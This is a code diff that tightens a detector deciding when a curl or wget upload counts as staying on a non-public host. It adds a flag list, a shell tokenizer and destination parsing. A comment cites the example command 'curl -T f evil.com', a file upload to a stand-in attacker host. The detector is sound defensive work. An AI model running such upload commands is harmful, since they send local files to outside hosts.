@@ -63,11 +63,109 @@ export function isNonPublicHost(authority: string): boolean {
   )
 }
 
+/** curl / wget options that take the next token as their value. */
+const VALUE_FLAGS = new Set([
+  '-H',
+  '--header',
+  '-d',
+  '--data',
+  '--data-raw',
+  '--data-binary',
+  '--data-urlencode',
+  '--data-ascii',
+  '-F',
+  '--form',
+  '--form-string',
+  '-T',
+  '--upload-file',
+  '-X',
+  '--request',
+  '-o',
+  '--output',
+  '-u',
+  '--user',
+  '-A',
+  '--user-agent',
+  '-e',
+  '--referer',
+  '-b',
+  '--cookie',
+  '-c',
+  '--cookie-jar',
+  '-w',
+  '--write-out',
+  '-m',
+  '--max-time',
+  '--connect-timeout',
+  '-x',
+  '--proxy',
+  '-E',
+  '--cert',
+  '--key',
+  '--cacert',
+  '-K',
+  '--config',
+  '-r',
+  '--range',
+  '-C',
+  '--continue-at',
+  '--retry',
+  '--resolve',
+  '--connect-to',
+  '-O',
+  '--output-document',
+  '--post-file',
+  '--post-data',
+])
+
+/** Shell tokens, keeping a quoted span whole and unquoted. */
+function shellTokens(text: string): string[] {
+  return (text.match(/'[^']*'|"[^"]*"|\S+/g) ?? []).map(t =>
+    t.replace(/^(['"])(.*)\1$/, '$2')
+  )
+}
+
 /**
- * True when `segment` names at least one literal URL and every literal URL in
- * the whole `command` is non-public — the only case an upload is exempt.
+ * The positional arguments of the curl / wget invocation in `segment` — its
+ * destinations. curl also takes a schemeless host (`curl -T f evil.com`), so
+ * every positional must be checked, not just the `http(s)://` ones. Shell
+ * redirections end the invocation.
+ */
+function uploadDestinations(segment: string): string[] | null {
+  const toks = shellTokens(segment)
+  const at = toks.findIndex(t => /^(?:\S*\/)?(?:curl|wget)$/.test(t))
+  if (at === -1) return null
+  const out: string[] = []
+  for (let i = at + 1; i < toks.length; i++) {
+    const t = toks[i] ?? ''
+    if (/^\d*[<>]/.test(t)) break
+    if (VALUE_FLAGS.has(t)) {
+      i++
+      continue
+    }
+    if (t.startsWith('-')) continue
+    out.push(t)
+  }
+  return out
+}
+
+/**
+ * True only when the upload's every destination is a literal http(s) URL to a
+ * non-public host, and no literal URL anywhere in the command is public — the
+ * only case an upload is exempt. A schemeless host, another scheme
+ * (`ftp://`), a variable, or a flag this parser does not know leaving an extra
+ * positional all keep it flagged.
  */
 export function uploadStaysLocal(segment: string, command: string): boolean {
-  if (literalUrlHosts(segment).length === 0) return false
-  return literalUrlHosts(command).every(isNonPublicHost)
+  const destinations = uploadDestinations(segment)
+  if (!destinations || destinations.length === 0) return false
+  const allLocalHttp = destinations.every(d => {
+    const hosts = literalUrlHosts(d)
+    return (
+      /^https?:\/\//i.test(d) &&
+      hosts.length === 1 &&
+      isNonPublicHost(hosts[0] ?? '')
+    )
+  })
+  return allLocalHttp && literalUrlHosts(command).every(isNonPublicHost)
 }
